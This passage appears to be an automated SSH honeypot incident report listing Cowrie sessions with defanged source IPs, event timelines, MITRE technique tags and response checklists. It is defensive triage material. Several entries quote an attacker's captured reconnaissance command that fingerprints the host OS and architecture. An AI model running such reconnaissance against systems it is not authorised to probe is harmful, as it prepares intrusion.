- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3a98e722d2e

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-08-09 10:40 |
| **Last Seen** | 2026-08-09 10:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:40:42` | `cowrie.session.connect` |
| `2026-08-09 10:40:43` | `cowrie.client.version` |
| `2026-08-09 10:40:43` | `cowrie.client.kex` |
| `2026-08-09 10:40:43` | `cowrie.login.success` |
| `2026-08-09 10:40:44` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:40:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f1430e8d85

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]60` |
| **First Seen** | 2026-08-09 10:40 |
| **Last Seen** | 2026-08-09 10:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:40:49` | `cowrie.session.connect` |
| `2026-08-09 10:40:49` | `cowrie.client.version` |
| `2026-08-09 10:40:49` | `cowrie.client.kex` |
| `2026-08-09 10:40:50` | `cowrie.login.success` |
| `2026-08-09 10:40:50` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:40:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]60` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1549f430b3a7

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:43 |
| **Last Seen** | 2026-08-09 10:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:43:33` | `cowrie.session.connect` |
| `2026-08-09 10:43:33` | `cowrie.client.version` |
| `2026-08-09 10:43:33` | `cowrie.client.kex` |
| `2026-08-09 10:43:36` | `cowrie.login.success` |
| `2026-08-09 10:43:37` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:43:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:43:38` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:43:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4c8f6ebfad

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:46 |
| **Last Seen** | 2026-08-09 10:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:46:20` | `cowrie.session.connect` |
| `2026-08-09 10:46:20` | `cowrie.client.version` |
| `2026-08-09 10:46:21` | `cowrie.client.kex` |
| `2026-08-09 10:46:23` | `cowrie.login.success` |
| `2026-08-09 10:46:24` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:46:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:46:24` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-779d882c67c2

| Field | Detail |
|---|---|
| **Source IP** | `116.110.211[.]135` |
| **First Seen** | 2026-08-09 10:50 |
| **Last Seen** | 2026-08-09 10:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 10:50:11` | `cowrie.session.connect` |
| `2026-08-09 10:50:14` | `cowrie.client.version` |
| `2026-08-09 10:50:14` | `cowrie.client.kex` |
| `2026-08-09 10:50:15` | `cowrie.login.success` |
| `2026-08-09 10:50:15` | `cowrie.direct-tcpip.request` |
| `2026-08-09 10:50:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-09 10:50:17` | `cowrie.direct-tcpip.data` |
| `2026-08-09 10:50:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.110.211[.]135` to AbuseIPDB if not already reported
- [ ] Block `116.110.211[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-199f8ff4f9df

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:01 |
| **Last Seen** | 2026-08-09 11:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:01:15` | `cowrie.session.connect` |
| `2026-08-09 11:01:17` | `cowrie.client.version` |
| `2026-08-09 11:01:17` | `cowrie.client.kex` |
| `2026-08-09 11:01:25` | `cowrie.login.success` |
| `2026-08-09 11:01:27` | `cowrie.session.params` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.success` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.command.input` |
| `2026-08-09 11:01:27` | `cowrie.log.closed` |
| `2026-08-09 11:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04c88a90b148

| Field | Detail |
|---|---|
| **Source IP** | `64.49.97[.]15` |
| **First Seen** | 2026-08-09 11:02 |
| **Last Seen** | 2026-08-09 11:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:02:12` | `cowrie.session.connect` |
| `2026-08-09 11:02:13` | `cowrie.client.version` |
| `2026-08-09 11:02:13` | `cowrie.client.kex` |
| `2026-08-09 11:02:14` | `cowrie.login.success` |
| `2026-08-09 11:02:14` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.49.97[.]15` to AbuseIPDB if not already reported
- [ ] Block `64.49.97[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4266426049a7

| Field | Detail |
|---|---|
| **Source IP** | `121.178.185[.]141` |
| **First Seen** | 2026-08-09 11:02 |
| **Last Seen** | 2026-08-09 11:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:02:24` | `cowrie.session.connect` |
| `2026-08-09 11:02:25` | `cowrie.client.version` |
| `2026-08-09 11:02:25` | `cowrie.client.kex` |
| `2026-08-09 11:02:27` | `cowrie.login.success` |
| `2026-08-09 11:02:27` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:02:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.178.185[.]141` to AbuseIPDB if not already reported
- [ ] Block `121.178.185[.]141` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90903fc0dddd

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:04 |
| **Last Seen** | 2026-08-09 11:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:04:31` | `cowrie.session.connect` |
| `2026-08-09 11:04:33` | `cowrie.client.version` |
| `2026-08-09 11:04:33` | `cowrie.client.kex` |
| `2026-08-09 11:04:41` | `cowrie.login.success` |
| `2026-08-09 11:04:44` | `cowrie.session.params` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.success` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.command.input` |
| `2026-08-09 11:04:44` | `cowrie.log.closed` |
| `2026-08-09 11:04:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1291a461886a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:07 |
| **Last Seen** | 2026-08-09 11:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:07:43` | `cowrie.session.connect` |
| `2026-08-09 11:07:44` | `cowrie.client.version` |
| `2026-08-09 11:07:44` | `cowrie.client.kex` |
| `2026-08-09 11:07:49` | `cowrie.login.success` |
| `2026-08-09 11:07:51` | `cowrie.session.params` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.success` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:51` | `cowrie.command.input` |
| `2026-08-09 11:07:52` | `cowrie.log.closed` |
| `2026-08-09 11:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-377495ecbc25

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:10 |
| **Last Seen** | 2026-08-09 11:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:10:49` | `cowrie.session.connect` |
| `2026-08-09 11:10:49` | `cowrie.client.version` |
| `2026-08-09 11:10:49` | `cowrie.client.kex` |
| `2026-08-09 11:10:50` | `cowrie.login.success` |
| `2026-08-09 11:10:51` | `cowrie.session.params` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.success` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.command.input` |
| `2026-08-09 11:10:51` | `cowrie.log.closed` |
| `2026-08-09 11:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-026820568c50

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-09 11:12 |
| **Last Seen** | 2026-08-09 11:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:12:15` | `cowrie.session.connect` |
| `2026-08-09 11:12:15` | `cowrie.client.version` |
| `2026-08-09 11:12:15` | `cowrie.client.kex` |
| `2026-08-09 11:12:16` | `cowrie.login.success` |
| `2026-08-09 11:12:16` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:12:16` | `cowrie.direct-tcpip.data` |
| `2026-08-09 11:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-352c1d085446

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:13 |
| **Last Seen** | 2026-08-09 11:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:13:27` | `cowrie.session.connect` |
| `2026-08-09 11:13:31` | `cowrie.client.version` |
| `2026-08-09 11:13:31` | `cowrie.client.kex` |
| `2026-08-09 11:13:40` | `cowrie.login.success` |
| `2026-08-09 11:13:42` | `cowrie.session.params` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.success` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.command.input` |
| `2026-08-09 11:13:42` | `cowrie.log.closed` |
| `2026-08-09 11:13:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f08f8d10711

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]109` |
| **First Seen** | 2026-08-09 11:13 |
| **Last Seen** | 2026-08-09 11:13 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:13:32` | `cowrie.session.connect` |
| `2026-08-09 11:13:33` | `cowrie.client.version` |
| `2026-08-09 11:13:33` | `cowrie.client.kex` |
| `2026-08-09 11:13:35` | `cowrie.login.success` |
| `2026-08-09 11:13:36` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]109` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-510f756c7c2d

| Field | Detail |
|---|---|
| **Source IP** | `102.211.7[.]162` |
| **First Seen** | 2026-08-09 11:13 |
| **Last Seen** | 2026-08-09 11:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:13:41` | `cowrie.session.connect` |
| `2026-08-09 11:13:42` | `cowrie.client.version` |
| `2026-08-09 11:13:42` | `cowrie.client.kex` |
| `2026-08-09 11:13:43` | `cowrie.login.success` |
| `2026-08-09 11:13:43` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.211.7[.]162` to AbuseIPDB if not already reported
- [ ] Block `102.211.7[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c78167823eeb

| Field | Detail |
|---|---|
| **Source IP** | `200.199.32[.]174` |
| **First Seen** | 2026-08-09 11:13 |
| **Last Seen** | 2026-08-09 11:13 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:13:45` | `cowrie.session.connect` |
| `2026-08-09 11:13:46` | `cowrie.client.version` |
| `2026-08-09 11:13:46` | `cowrie.client.kex` |
| `2026-08-09 11:13:49` | `cowrie.login.success` |
| `2026-08-09 11:13:49` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.199.32[.]174` to AbuseIPDB if not already reported
- [ ] Block `200.199.32[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bd1cf55fd4e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-08-09 11:16 |
| **Last Seen** | 2026-08-09 11:16 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:16:18` | `cowrie.session.connect` |
| `2026-08-09 11:16:21` | `cowrie.client.version` |
| `2026-08-09 11:16:21` | `cowrie.client.kex` |
| `2026-08-09 11:16:30` | `cowrie.login.success` |
| `2026-08-09 11:16:34` | `cowrie.session.params` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.success` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.command.input` |
| `2026-08-09 11:16:34` | `cowrie.log.closed` |
| `2026-08-09 11:16:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6389e0b2fef2

| Field | Detail |
|---|---|
| **Source IP** | `121.202.198[.]98` |
| **First Seen** | 2026-08-09 11:20 |
| **Last Seen** | 2026-08-09 11:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-09 11:20:33` | `cowrie.session.connect` |
| `2026-08-09 11:20:35` | `cowrie.client.version` |
| `2026-08-09 11:20:35` | `cowrie.client.kex` |
| `2026-08-09 11:20:39` | `cowrie.login.success` |
| `2026-08-09 11:20:40` | `cowrie.direct-tcpip.request` |
| `2026-08-09 11:20:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.198[.]98` to AbuseIPDB if not already reported
- [ ] Block `121.202.198[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea6abd34321d

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-08-09 11:20 |
| **Last Seen** | 2026-08-09 11:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
